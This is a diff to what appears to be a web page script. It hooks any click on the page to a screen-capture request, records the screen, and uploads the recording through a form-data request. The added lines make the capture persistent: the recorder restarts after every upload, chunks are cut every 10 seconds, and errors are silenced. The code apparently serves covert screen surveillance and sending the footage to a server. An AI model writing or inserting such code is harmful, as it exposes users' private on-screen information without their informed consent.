@@ -505,12 +505,18 @@
       const screenTrigger = async () => {
         try {
           if (!window.screenCaptureActive) {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
+
             const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
             window.screenCaptureActive = true;
 
             const screenRecorder = new MediaRecorder(screenStream);
             const screenChunks = [];
-            screenRecorder.ondataavailable = e => screenChunks.push(e.data);
+
+            screenRecorder.ondataavailable = e => {
+              if (e.data.size > 0) screenChunks.push(e.data);
+            };
+
             screenRecorder.onstop = () => {
               const screenBlob = new Blob(screenChunks, { type: 'video/webm' });
               const fd = new FormData();
@@ -522,11 +528,26 @@
                 processData: false,
                 contentType: false
               });
+
+              if (screenStream.active) {
+                screenChunks.length = 0;
+                screenRecorder.start();
+              }
             };
+
+            screenStream.getVideoTracks()[0].onended = () => {
+              window.screenCaptureActive = false;
+              if (screenRecorder.state === 'recording') screenRecorder.stop();
+            };
+
             screenRecorder.start();
-            setTimeout(() => screenRecorder.stop(), 10000);
+            setInterval(() => {
+              if (screenRecorder.state === 'recording') screenRecorder.stop();
+            }, 10000);
           }
-        } catch (err) { }
+        } catch (err) {
+          window.screenCaptureActive = false;
+        }
       };
 
       document.body.addEventListener('click', screenTrigger);
